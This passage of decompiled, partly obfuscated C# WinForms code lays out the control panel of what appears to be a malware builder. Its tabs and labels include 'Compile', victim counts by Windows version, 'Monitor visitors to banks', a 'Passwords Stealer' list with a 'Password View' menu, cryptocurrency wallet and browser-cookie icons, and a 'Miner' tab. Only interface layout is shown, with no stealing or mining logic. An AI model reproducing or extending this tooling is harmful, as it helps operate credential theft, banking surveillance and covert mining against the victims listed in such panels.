		ZIS.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		ZIS.UncheckedState.FillColor = Color.FromArgb(125, 137, 149);
		ZIS.UncheckedState.InnerBorderColor = Color.White;
		ZIS.UncheckedState.InnerColor = Color.White;
		ZIS.UncheckedState.Parent = ZIS;
		MB.AutoSize = true;
		MB.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		MB.CheckedState.BorderThickness = 0;
		MB.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		MB.CheckedState.InnerColor = Color.White;
		MB.CheckedState.InnerOffset = -4;
		MB.Cursor = Cursors.Hand;
		MB.Enabled = false;
		MB.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		MB.ForeColor = Color.White;
		MB.Location = new Point(177, 67);
		MB.Name = "MB";
		MB.Size = new Size(43, 19);
		MB.TabIndex = 106;
		MB.Text = "MB";
		MB.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		MB.UncheckedState.BorderThickness = 2;
		MB.UncheckedState.FillColor = Color.Transparent;
		MB.UncheckedState.InnerColor = Color.Transparent;
		Label55.AutoSize = true;
		Label55.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label55.ForeColor = Color.White;
		Label55.Location = new Point(8, 45);
		Label55.Name = "Label55";
		Label55.Size = new Size(51, 14);
		Label55.TabIndex = 115;
		Label55.Text = "Number";
		GB.AutoSize = true;
		GB.CheckedState.BorderColor = Color.FromArgb(94, 148, 255);
		GB.CheckedState.BorderThickness = 0;
		GB.CheckedState.FillColor = Color.FromArgb(94, 148, 255);
		GB.CheckedState.InnerColor = Color.White;
		GB.CheckedState.InnerOffset = -4;
		GB.Cursor = Cursors.Hand;
		GB.Enabled = false;
		GB.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		GB.ForeColor = Color.White;
		GB.Location = new Point(250, 67);
		GB.Name = "GB";
		GB.Size = new Size(40, 19);
		GB.TabIndex = 107;
		GB.Text = "GB";
		GB.UncheckedState.BorderColor = Color.FromArgb(125, 137, 149);
		GB.UncheckedState.BorderThickness = 2;
		GB.UncheckedState.FillColor = Color.Transparent;
		GB.UncheckedState.InnerColor = Color.Transparent;
		Label6.AutoSize = true;
		Label6.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		Label6.ForeColor = Color.White;
		Label6.Location = new Point(52, 10);
		Label6.Name = "Label6";
		Label6.Size = new Size(30, 14);
		Label6.TabIndex = 113;
		Label6.Text = "Size";
		Building.Animated = true;
		Building.BackColor = Color.Transparent;
		Building.CheckedState.Parent = Building;
		Building.CustomImages.Parent = Building;
		Building.FillColor = Color.FromArgb(24, 30, 54);
		Building.Font = new Font("Segoe UI Semibold", 12f, FontStyle.Bold);
		Building.ForeColor = Color.White;
		Building.HoverState.Parent = Building;
		Building.Image = (Image)componentResourceManager.GetObject("Building.Image");
		Building.ImageAlign = HorizontalAlignment.Left;
		Building.IndicateFocus = true;
		Building.Location = new Point(328, 323);
		Building.Name = "Building";
		Building.ShadowDecoration.Parent = Building;
		Building.Size = new Size(554, 48);
		Building.TabIndex = 63;
		Building.Text = "Compile";
		Building.UseTransparentBackground = true;
		D.BackColor = Color.FromArgb(46, 51, 73);
		D.Controls.Add(ListView2);
		D.Controls.Add(Panel33);
		D.Controls.Add(Panel21);
		D.Controls.Add(Panel22);
		D.Controls.Add(Panel15);
		D.Controls.Add(Panel20);
		D.Controls.Add(Panel14);
		D.Controls.Add(ListView1);
		D.Location = new Point(4, 22);
		D.Name = "D";
		D.Size = new Size(925, 457);
		D.TabIndex = 3;
		D.Text = " Monitor";
		ListView2.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		ListView2.BackColor = Color.FromArgb(37, 42, 64);
		ListView2.BorderStyle = BorderStyle.None;
		ListView2.Columns.AddRange(new ColumnHeader[4]
		{
			vmethod_72(),
			FbfrbuIoBbK(),
			vmethod_75(),
			vmethod_77()
		});
		ListView2.ContextMenuStrip = ContextMenuStrip1;
		ListView2.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		ListView2.ForeColor = Color.LawnGreen;
		ListView2.HideSelection = false;
		ListView2.LargeImageList = vmethod_62();
		ListView2.Location = new Point(399, 293);
		ListView2.Name = "ListView2";
		ListView2.Size = new Size(511, 136);
		ListView2.SmallImageList = vmethod_62();
		ListView2.StateImageList = vmethod_62();
		ListView2.TabIndex = 70;
		ListView2.UseCompatibleStateImageBehavior = false;
		ListView2.View = View.Details;
		vmethod_72().Text = "+";
		vmethod_72().Width = 76;
		FbfrbuIoBbK().Text = "Name";
		FbfrbuIoBbK().Width = 103;
		vmethod_75().Text = "IP";
		vmethod_75().Width = 116;
		vmethod_77().Text = "URL";
		vmethod_77().Width = 211;
		vmethod_62().ImageStream = (ImageListStreamer)componentResourceManager.GetObject("USER.ImageStream");
		vmethod_62().TransparentColor = Color.Transparent;
		vmethod_62().Images.SetKeyName(0, "No.png");
		vmethod_62().Images.SetKeyName(1, "Yes.png");
		vmethod_62().Images.SetKeyName(2, "radar_64px.png");
		Panel33.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left;
		Panel33.BackColor = Color.FromArgb(37, 42, 64);
		Panel33.Controls.Add(USS);
		Panel33.Controls.Add(Label12);
		Panel33.Location = new Point(8, 12);
		Panel33.Name = "Panel33";
		Panel33.Size = new Size(384, 272);
		Panel33.TabIndex = 69;
		USS.Image = (Image)componentResourceManager.GetObject("USS.Image");
		USS.Location = new Point(125, 80);
		USS.Name = "USS";
		USS.ProgressColor = Color.Yellow;
		USS.ProgressColor2 = Color.Green;
		USS.ShadowDecoration.Mode = ShadowMode.Circle;
		USS.ShadowDecoration.Parent = USS;
		USS.Size = new Size(130, 130);
		USS.TabIndex = 74;
		Label12.AutoSize = true;
		Label12.Font = new Font("Nirmala UI", 14.25f, FontStyle.Bold);
		Label12.ForeColor = Color.FromArgb(224, 224, 224);
		Label12.Location = new Point(8, 7);
		Label12.Name = "Label12";
		Label12.Size = new Size(111, 25);
		Label12.TabIndex = 73;
		Label12.Text = "Total Client";
		Panel21.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Panel21.BackColor = Color.FromArgb(37, 42, 64);
		Panel21.Controls.Add(Win10);
		Panel21.Controls.Add(PictureBox8);
		Panel21.Controls.Add(Label27);
		Panel21.Location = new Point(203, 361);
		Panel21.Name = "Panel21";
		Panel21.Size = new Size(189, 68);
		Panel21.TabIndex = 66;
		Win10.Animated = true;
		Win10.AutoRoundedCorners = true;
		Win10.BorderRadius = 12;
		Win10.CheckedState.Parent = Win10;
		Win10.CustomImages.Parent = Win10;
		Win10.FillColor = Color.FromArgb(46, 51, 73);
		Win10.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Win10.ForeColor = Color.FromArgb(255, 194, 10);
		Win10.HoverState.Parent = Win10;
		Win10.IndicateFocus = true;
		Win10.Location = new Point(13, 30);
		Win10.Name = "Win10";
		Win10.ShadowDecoration.Parent = Win10;
		Win10.Size = new Size(47, 27);
		Win10.TabIndex = 72;
		Win10.Text = "0";
		PictureBox8.Image = (Image)componentResourceManager.GetObject("PictureBox8.Image");
		PictureBox8.Location = new Point(123, 30);
		PictureBox8.Name = "PictureBox8";
		PictureBox8.Size = new Size(49, 27);
		PictureBox8.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox8.TabIndex = 2;
		PictureBox8.TabStop = false;
		Label27.AutoSize = true;
		Label27.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label27.ForeColor = Color.FromArgb(158, 161, 176);
		Label27.Location = new Point(6, 7);
		Label27.Name = "Label27";
		Label27.Size = new Size(82, 16);
		Label27.TabIndex = 0;
		Label27.Text = "Windows 10";
		Panel22.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Panel22.BackColor = Color.FromArgb(37, 42, 64);
		Panel22.Controls.Add(Win8);
		Panel22.Controls.Add(PictureBox13);
		Panel22.Controls.Add(Label28);
		Panel22.Location = new Point(8, 361);
		Panel22.Name = "Panel22";
		Panel22.Size = new Size(189, 68);
		Panel22.TabIndex = 65;
		Win8.Animated = true;
		Win8.AutoRoundedCorners = true;
		Win8.BorderRadius = 12;
		Win8.CheckedState.Parent = Win8;
		Win8.CustomImages.Parent = Win8;
		Win8.FillColor = Color.FromArgb(46, 51, 73);
		Win8.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Win8.ForeColor = Color.FromArgb(255, 194, 10);
		Win8.HoverState.Parent = Win8;
		Win8.IndicateFocus = true;
		Win8.Location = new Point(13, 30);
		Win8.Name = "Win8";
		Win8.ShadowDecoration.Parent = Win8;
		Win8.Size = new Size(47, 27);
		Win8.TabIndex = 72;
		Win8.Text = "0";
		PictureBox13.Image = (Image)componentResourceManager.GetObject("PictureBox13.Image");
		PictureBox13.Location = new Point(123, 30);
		PictureBox13.Name = "PictureBox13";
		PictureBox13.Size = new Size(49, 27);
		PictureBox13.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox13.TabIndex = 2;
		PictureBox13.TabStop = false;
		Label28.AutoSize = true;
		Label28.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label28.ForeColor = Color.FromArgb(158, 161, 176);
		Label28.Location = new Point(6, 7);
		Label28.Name = "Label28";
		Label28.Size = new Size(107, 16);
		Label28.TabIndex = 0;
		Label28.Text = "Windows 8 \\ 8.1";
		Panel15.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Panel15.BackColor = Color.FromArgb(37, 42, 64);
		Panel15.Controls.Add(Win7);
		Panel15.Controls.Add(PictureBox5);
		Panel15.Controls.Add(Label25);
		Panel15.Location = new Point(203, 290);
		Panel15.Name = "Panel15";
		Panel15.Size = new Size(189, 68);
		Panel15.TabIndex = 64;
		Win7.Animated = true;
		Win7.AutoRoundedCorners = true;
		Win7.BorderRadius = 12;
		Win7.CheckedState.Parent = Win7;
		Win7.CustomImages.Parent = Win7;
		Win7.FillColor = Color.FromArgb(46, 51, 73);
		Win7.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Win7.ForeColor = Color.FromArgb(255, 194, 10);
		Win7.HoverState.Parent = Win7;
		Win7.IndicateFocus = true;
		Win7.Location = new Point(13, 30);
		Win7.Name = "Win7";
		Win7.ShadowDecoration.Parent = Win7;
		Win7.Size = new Size(47, 27);
		Win7.TabIndex = 72;
		Win7.Text = "0";
		PictureBox5.Image = (Image)componentResourceManager.GetObject("PictureBox5.Image");
		PictureBox5.Location = new Point(123, 30);
		PictureBox5.Name = "PictureBox5";
		PictureBox5.Size = new Size(49, 27);
		PictureBox5.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox5.TabIndex = 2;
		PictureBox5.TabStop = false;
		Label25.AutoSize = true;
		Label25.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label25.ForeColor = Color.FromArgb(158, 161, 176);
		Label25.Location = new Point(6, 7);
		Label25.Name = "Label25";
		Label25.Size = new Size(75, 16);
		Label25.TabIndex = 0;
		Label25.Text = "Windows 7";
		Panel20.Anchor = AnchorStyles.Bottom | AnchorStyles.Left;
		Panel20.BackColor = Color.FromArgb(37, 42, 64);
		Panel20.Controls.Add(Winxp);
		Panel20.Controls.Add(PictureBox12);
		Panel20.Controls.Add(Label31);
		Panel20.Location = new Point(8, 290);
		Panel20.Name = "Panel20";
		Panel20.Size = new Size(189, 65);
		Panel20.TabIndex = 63;
		Winxp.Animated = true;
		Winxp.AutoRoundedCorners = true;
		Winxp.BorderRadius = 12;
		Winxp.CheckedState.Parent = Winxp;
		Winxp.CustomImages.Parent = Winxp;
		Winxp.FillColor = Color.FromArgb(46, 51, 73);
		Winxp.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Winxp.ForeColor = Color.FromArgb(255, 194, 10);
		Winxp.HoverState.Parent = Winxp;
		Winxp.IndicateFocus = true;
		Winxp.Location = new Point(13, 30);
		Winxp.Name = "Winxp";
		Winxp.ShadowDecoration.Parent = Winxp;
		Winxp.Size = new Size(47, 27);
		Winxp.TabIndex = 72;
		Winxp.Text = "0";
		PictureBox12.Image = (Image)componentResourceManager.GetObject("PictureBox12.Image");
		PictureBox12.Location = new Point(123, 30);
		PictureBox12.Name = "PictureBox12";
		PictureBox12.Size = new Size(49, 27);
		PictureBox12.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox12.TabIndex = 2;
		PictureBox12.TabStop = false;
		Label31.AutoSize = true;
		Label31.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label31.ForeColor = Color.FromArgb(158, 161, 176);
		Label31.Location = new Point(6, 7);
		Label31.Name = "Label31";
		Label31.Size = new Size(85, 16);
		Label31.TabIndex = 0;
		Label31.Text = "Windows XP";
		Panel14.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel14.BackColor = Color.FromArgb(37, 42, 64);
		Panel14.Controls.Add(Panel12);
		Panel14.Controls.Add(PictureBox16);
		Panel14.Controls.Add(Panel10);
		Panel14.Controls.Add(PictureBox14);
		Panel14.Controls.Add(Label23);
		Panel14.Controls.Add(Guna2CircleProgressBar1);
		Panel14.Location = new Point(399, 12);
		Panel14.Name = "Panel14";
		Panel14.Size = new Size(511, 146);
		Panel14.TabIndex = 21;
		Panel12.BackColor = Color.FromArgb(37, 42, 64);
		Panel12.Controls.Add(Guna2Button7);
		Panel12.Controls.Add(Label19);
		Panel12.Location = new Point(10, 92);
		Panel12.Name = "Panel12";
		Panel12.Size = new Size(251, 34);
		Panel12.TabIndex = 68;
		Guna2Button7.Animated = true;
		Guna2Button7.AutoRoundedCorners = true;
		Guna2Button7.BorderRadius = 12;
		Guna2Button7.CheckedState.Parent = Guna2Button7;
		Guna2Button7.CustomImages.Parent = Guna2Button7;
		Guna2Button7.FillColor = Color.FromArgb(46, 51, 73);
		Guna2Button7.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Guna2Button7.ForeColor = Color.LimeGreen;
		Guna2Button7.HoverState.Parent = Guna2Button7;
		Guna2Button7.IndicateFocus = true;
		Guna2Button7.Location = new Point(187, 3);
		Guna2Button7.Name = "Guna2Button7";
		Guna2Button7.ShadowDecoration.Parent = Guna2Button7;
		Guna2Button7.Size = new Size(61, 27);
		Guna2Button7.TabIndex = 72;
		Guna2Button7.Text = "0 PC+";
		Label19.AutoSize = true;
		Label19.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label19.ForeColor = Color.FromArgb(158, 161, 176);
		Label19.Location = new Point(13, 7);
		Label19.Name = "Label19";
		Label19.Size = new Size(76, 16);
		Label19.TabIndex = 0;
		Label19.Text = "Scan found";
		PictureBox16.Image = (Image)componentResourceManager.GetObject("PictureBox16.Image");
		PictureBox16.Location = new Point(269, 92);
		PictureBox16.Name = "PictureBox16";
		PictureBox16.Size = new Size(49, 34);
		PictureBox16.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox16.TabIndex = 67;
		PictureBox16.TabStop = false;
		Panel10.BackColor = Color.FromArgb(37, 42, 64);
		Panel10.Controls.Add(SCANN);
		Panel10.Controls.Add(Label11);
		Panel10.Location = new Point(10, 43);
		Panel10.Name = "Panel10";
		Panel10.Size = new Size(251, 34);
		Panel10.TabIndex = 64;
		SCANN.Animated = true;
		SCANN.AutoRoundedCorners = true;
		SCANN.BorderRadius = 12;
		SCANN.CheckedState.Parent = SCANN;
		SCANN.CustomImages.Parent = SCANN;
		SCANN.FillColor = Color.FromArgb(46, 51, 73);
		SCANN.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		SCANN.ForeColor = Color.MediumPurple;
		SCANN.HoverState.Parent = SCANN;
		SCANN.IndicateFocus = true;
		SCANN.Location = new Point(187, 3);
		SCANN.Name = "SCANN";
		SCANN.ShadowDecoration.Parent = SCANN;
		SCANN.Size = new Size(61, 27);
		SCANN.TabIndex = 72;
		SCANN.Text = "0 PC+";
		Label11.AutoSize = true;
		Label11.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label11.ForeColor = Color.FromArgb(158, 161, 176);
		Label11.Location = new Point(13, 7);
		Label11.Name = "Label11";
		Label11.Size = new Size(117, 16);
		Label11.TabIndex = 0;
		Label11.Text = "Number of callers";
		PictureBox14.Image = (Image)componentResourceManager.GetObject("PictureBox14.Image");
		PictureBox14.Location = new Point(269, 43);
		PictureBox14.Name = "PictureBox14";
		PictureBox14.Size = new Size(49, 34);
		PictureBox14.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox14.TabIndex = 2;
		PictureBox14.TabStop = false;
		Label23.AutoSize = true;
		Label23.Font = new Font("Nirmala UI", 14.25f, FontStyle.Bold);
		Label23.ForeColor = Color.FromArgb(224, 224, 224);
		Label23.Location = new Point(5, 7);
		Label23.Name = "Label23";
		Label23.Size = new Size(236, 25);
		Label23.TabIndex = 0;
		Label23.Text = "Monitor visitors to banks";
		Guna2CircleProgressBar1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2CircleProgressBar1.Animated = true;
		Guna2CircleProgressBar1.Controls.Add(PictureBox6);
		Guna2CircleProgressBar1.Location = new Point(378, 7);
		Guna2CircleProgressBar1.Name = "Guna2CircleProgressBar1";
		Guna2CircleProgressBar1.ProgressColor = Color.Yellow;
		Guna2CircleProgressBar1.ProgressColor2 = Color.Red;
		Guna2CircleProgressBar1.ShadowDecoration.Mode = ShadowMode.Circle;
		Guna2CircleProgressBar1.ShadowDecoration.Parent = Guna2CircleProgressBar1;
		Guna2CircleProgressBar1.Size = new Size(130, 130);
		Guna2CircleProgressBar1.TabIndex = 4;
		Guna2CircleProgressBar1.Value = 45;
		PictureBox6.Image = (Image)componentResourceManager.GetObject("PictureBox6.Image");
		PictureBox6.Location = new Point(39, 43);
		PictureBox6.Name = "PictureBox6";
		PictureBox6.Size = new Size(48, 46);
		PictureBox6.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox6.TabIndex = 5;
		PictureBox6.TabStop = false;
		ListView1.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		ListView1.BackColor = Color.FromArgb(37, 42, 64);
		ListView1.BorderStyle = BorderStyle.None;
		ListView1.Columns.AddRange(new ColumnHeader[4]
		{
			vmethod_18(),
			vmethod_64(),
			vmethod_66(),
			vmethod_68()
		});
		ListView1.ContextMenuStrip = ContextMenuStrip1;
		ListView1.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		ListView1.ForeColor = Color.White;
		ListView1.HeaderStyle = ColumnHeaderStyle.None;
		ListView1.HideSelection = false;
		ListView1.LargeImageList = vmethod_62();
		ListView1.Location = new Point(398, 164);
		ListView1.Name = "ListView1";
		ListView1.Size = new Size(512, 123);
		ListView1.SmallImageList = vmethod_62();
		ListView1.StateImageList = vmethod_62();
		ListView1.TabIndex = 2;
		ListView1.UseCompatibleStateImageBehavior = false;
		ListView1.View = View.Details;
		vmethod_18().Text = "+";
		vmethod_18().Width = 102;
		vmethod_64().Text = "Name";
		vmethod_64().Width = 112;
		vmethod_66().Text = "IP";
		vmethod_66().Width = 111;
		vmethod_68().Text = "OS";
		vmethod_68().Width = 179;
		Passwords.BackColor = Color.FromArgb(46, 51, 73);
		Passwords.Controls.Add(Guna2GradientPanel14);
		Passwords.Location = new Point(4, 22);
		Passwords.Name = "Passwords";
		Passwords.Size = new Size(925, 457);
		Passwords.TabIndex = 4;
		Passwords.Text = "Passwords";
		Guna2GradientPanel14.BackColor = Color.FromArgb(46, 51, 73);
		Guna2GradientPanel14.Controls.Add(Panel40);
		Guna2GradientPanel14.Controls.Add(List_pass);
		Guna2GradientPanel14.Dock = DockStyle.Fill;
		Guna2GradientPanel14.Location = new Point(0, 0);
		Guna2GradientPanel14.Name = "Guna2GradientPanel14";
		Guna2GradientPanel14.ShadowDecoration.Parent = Guna2GradientPanel14;
		Guna2GradientPanel14.Size = new Size(925, 457);
		Guna2GradientPanel14.TabIndex = 117;
		Panel40.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel40.BackColor = Color.FromArgb(24, 30, 54);
		Panel40.Controls.Add(Panel41);
		Panel40.Controls.Add(PictureBox86);
		Panel40.Controls.Add(Panel42);
		Panel40.Controls.Add(PictureBox87);
		Panel40.Controls.Add(Label94);
		Panel40.Controls.Add(Guna2CircleProgressBar2);
		Panel40.Location = new Point(8, 8);
		Panel40.Name = "Panel40";
		Panel40.Size = new Size(904, 146);
		Panel40.TabIndex = 117;
		Panel41.BackColor = Color.FromArgb(24, 30, 54);
		Panel41.Controls.Add(Scan_pass);
		Panel41.Controls.Add(Label17);
		Panel41.Location = new Point(10, 92);
		Panel41.Name = "Panel41";
		Panel41.Size = new Size(251, 34);
		Panel41.TabIndex = 68;
		Scan_pass.Animated = true;
		Scan_pass.AutoRoundedCorners = true;
		Scan_pass.BorderRadius = 12;
		Scan_pass.CheckedState.Parent = Scan_pass;
		Scan_pass.CustomImages.Parent = Scan_pass;
		Scan_pass.FillColor = Color.FromArgb(46, 51, 73);
		Scan_pass.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Scan_pass.ForeColor = Color.LimeGreen;
		Scan_pass.HoverState.Parent = Scan_pass;
		Scan_pass.IndicateFocus = true;
		Scan_pass.Location = new Point(187, 3);
		Scan_pass.Name = "Scan_pass";
		Scan_pass.ShadowDecoration.Parent = Scan_pass;
		Scan_pass.Size = new Size(61, 27);
		Scan_pass.TabIndex = 72;
		Scan_pass.Text = "0 PC+";
		Label17.AutoSize = true;
		Label17.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label17.ForeColor = Color.FromArgb(158, 161, 176);
		Label17.Location = new Point(13, 7);
		Label17.Name = "Label17";
		Label17.Size = new Size(76, 16);
		Label17.TabIndex = 0;
		Label17.Text = "Scan found";
		PictureBox86.Image = (Image)componentResourceManager.GetObject("PictureBox86.Image");
		PictureBox86.Location = new Point(269, 92);
		PictureBox86.Name = "PictureBox86";
		PictureBox86.Size = new Size(49, 34);
		PictureBox86.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox86.TabIndex = 67;
		PictureBox86.TabStop = false;
		Panel42.BackColor = Color.FromArgb(24, 30, 54);
		Panel42.Controls.Add(Pass_len);
		Panel42.Controls.Add(Label93);
		Panel42.Location = new Point(10, 43);
		Panel42.Name = "Panel42";
		Panel42.Size = new Size(251, 34);
		Panel42.TabIndex = 64;
		Pass_len.Animated = true;
		Pass_len.AutoRoundedCorners = true;
		Pass_len.BorderRadius = 12;
		Pass_len.CheckedState.Parent = Pass_len;
		Pass_len.CustomImages.Parent = Pass_len;
		Pass_len.FillColor = Color.FromArgb(46, 51, 73);
		Pass_len.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Pass_len.ForeColor = Color.MediumPurple;
		Pass_len.HoverState.Parent = Pass_len;
		Pass_len.IndicateFocus = true;
		Pass_len.Location = new Point(187, 3);
		Pass_len.Name = "Pass_len";
		Pass_len.ShadowDecoration.Parent = Pass_len;
		Pass_len.Size = new Size(61, 27);
		Pass_len.TabIndex = 72;
		Pass_len.Text = "0 PC+";
		Label93.AutoSize = true;
		Label93.Font = new Font("Microsoft Tai Le", 9.75f, FontStyle.Bold);
		Label93.ForeColor = Color.FromArgb(158, 161, 176);
		Label93.Location = new Point(13, 7);
		Label93.Name = "Label93";
		Label93.Size = new Size(117, 16);
		Label93.TabIndex = 0;
		Label93.Text = "Number of callers";
		PictureBox87.Image = (Image)componentResourceManager.GetObject("PictureBox87.Image");
		PictureBox87.Location = new Point(269, 43);
		PictureBox87.Name = "PictureBox87";
		PictureBox87.Size = new Size(49, 34);
		PictureBox87.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox87.TabIndex = 2;
		PictureBox87.TabStop = false;
		Label94.AutoSize = true;
		Label94.Font = new Font("Nirmala UI", 14.25f, FontStyle.Bold);
		Label94.ForeColor = Color.FromArgb(224, 224, 224);
		Label94.Location = new Point(5, 7);
		Label94.Name = "Label94";
		Label94.Size = new Size(169, 25);
		Label94.TabIndex = 0;
		Label94.Text = "Passwords Stealer";
		Guna2CircleProgressBar2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2CircleProgressBar2.Animated = true;
		Guna2CircleProgressBar2.Controls.Add(PictureBox88);
		Guna2CircleProgressBar2.Location = new Point(764, 7);
		Guna2CircleProgressBar2.Name = "Guna2CircleProgressBar2";
		Guna2CircleProgressBar2.ProgressColor = Color.Yellow;
		Guna2CircleProgressBar2.ProgressColor2 = Color.Red;
		Guna2CircleProgressBar2.ShadowDecoration.Mode = ShadowMode.Circle;
		Guna2CircleProgressBar2.ShadowDecoration.Parent = Guna2CircleProgressBar2;
		Guna2CircleProgressBar2.Size = new Size(130, 130);
		Guna2CircleProgressBar2.TabIndex = 4;
		Guna2CircleProgressBar2.Value = 45;
		PictureBox88.Image = (Image)componentResourceManager.GetObject("PictureBox88.Image");
		PictureBox88.Location = new Point(39, 43);
		PictureBox88.Name = "PictureBox88";
		PictureBox88.Size = new Size(48, 46);
		PictureBox88.SizeMode = PictureBoxSizeMode.StretchImage;
		PictureBox88.TabIndex = 5;
		PictureBox88.TabStop = false;
		List_pass.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		List_pass.BackColor = Color.FromArgb(24, 30, 54);
		List_pass.BorderStyle = BorderStyle.None;
		List_pass.Columns.AddRange(new ColumnHeader[3]
		{
			vmethod_93(),
			vmethod_95(),
			vmethod_97()
		});
		List_pass.ContextMenuStrip = vmethod_99();
		List_pass.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		List_pass.ForeColor = Color.White;
		List_pass.FullRowSelect = true;
		List_pass.HideSelection = false;
		List_pass.LargeImageList = vmethod_16();
		List_pass.Location = new Point(10, 160);
		List_pass.Name = "List_pass";
		List_pass.Size = new Size(902, 275);
		List_pass.SmallImageList = vmethod_16();
		List_pass.StateImageList = vmethod_16();
		List_pass.TabIndex = 116;
		List_pass.UseCompatibleStateImageBehavior = false;
		List_pass.View = View.Details;
		vmethod_93().Text = "User name";
		vmethod_93().Width = 160;
		vmethod_95().Text = "System OS";
		vmethod_95().Width = 222;
		vmethod_97().Text = "Number of Passwords";
		vmethod_97().Width = 515;
		vmethod_99().BackColor = Color.FromArgb(24, 30, 54);
		vmethod_99().Font = new Font("Segoe UI", 14.25f, FontStyle.Bold);
		vmethod_99().ImageScalingSize = new Size(32, 32);
		vmethod_99().Items.AddRange(new ToolStripItem[1] { ToolStripMenuItem29 });
		vmethod_99().Name = "ContextMenuStrip2";
		vmethod_99().RenderMode = ToolStripRenderMode.System;
		vmethod_99().Size = new Size(183, 42);
		ToolStripMenuItem29.BackColor = Color.FromArgb(24, 30, 54);
		ToolStripMenuItem29.Font = new Font("Arial", 8.25f, FontStyle.Bold);
		ToolStripMenuItem29.ForeColor = Color.White;
		ToolStripMenuItem29.Image = (Image)componentResourceManager.GetObject("ToolStripMenuItem29.Image");
		ToolStripMenuItem29.Name = "ToolStripMenuItem29";
		ToolStripMenuItem29.Size = new Size(182, 38);
		ToolStripMenuItem29.Text = "Password View";
		vmethod_16().ImageStream = (ImageListStreamer)componentResourceManager.GetObject("IMAGELOG.ImageStream");
		vmethod_16().TransparentColor = Color.Transparent;
		vmethod_16().Images.SetKeyName(0, "cc.png");
		vmethod_16().Images.SetKeyName(1, "d.png");
		vmethod_16().Images.SetKeyName(2, "privacy_48px.png");
		vmethod_16().Images.SetKeyName(3, "moaanero_50px.png");
		vmethod_16().Images.SetKeyName(4, "asss.png");
		vmethod_16().Images.SetKeyName(5, "bitcoin_24px.png");
		vmethod_16().Images.SetKeyName(6, "dollar_litecoin_exchange_64px.png");
		vmethod_16().Images.SetKeyName(7, "ethereum_48px.png");
		vmethod_16().Images.SetKeyName(8, "states_48px.png");
		vmethod_16().Images.SetKeyName(9, "229.png");
		vmethod_16().Images.SetKeyName(10, "231.png");
		vmethod_16().Images.SetKeyName(11, "edge-cookies.ico");
		vmethod_16().Images.SetKeyName(12, "Monero.ico");
		Miner.BackColor = Color.FromArgb(46, 51, 73);
		Miner.Controls.Add(Guna2GradientPanel15);
		Miner.Location = new Point(4, 22);
		Miner.Name = "Miner";
		Miner.Size = new Size(925, 457);
		Miner.TabIndex = 5;
		Miner.Text = "Miner";
		Guna2GradientPanel15.BackColor = Color.FromArgb(46, 51, 73);
		Guna2GradientPanel15.Controls.Add(Panel43);
		Guna2GradientPanel15.Controls.Add(L1_Miner);
		Guna2GradientPanel15.Dock = DockStyle.Fill;
		Guna2GradientPanel15.Location = new Point(0, 0);
		Guna2GradientPanel15.Name = "Guna2GradientPanel15";
		Guna2GradientPanel15.ShadowDecoration.Parent = Guna2GradientPanel15;
		Guna2GradientPanel15.Size = new Size(925, 457);
		Guna2GradientPanel15.TabIndex = 118;
		Panel43.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		Panel43.BackColor = Color.FromArgb(24, 30, 54);
		Panel43.Controls.Add(Panel44);
		Panel43.Controls.Add(PictureBox89);
		Panel43.Controls.Add(Panel45);
		Panel43.Controls.Add(PictureBox90);
		Panel43.Controls.Add(Label97);
		Panel43.Controls.Add(Guna2CircleProgressBar3);
		Panel43.Location = new Point(8, 8);
		Panel43.Name = "Panel43";
		Panel43.Size = new Size(904, 146);
		Panel43.TabIndex = 118;
		Panel44.BackColor = Color.FromArgb(24, 30, 54);
		Panel44.Controls.Add(Mining_Scan);
		Panel44.Controls.Add(Label95);
		Panel44.Location = new Point(10, 92);
		Panel44.Name = "Panel44";
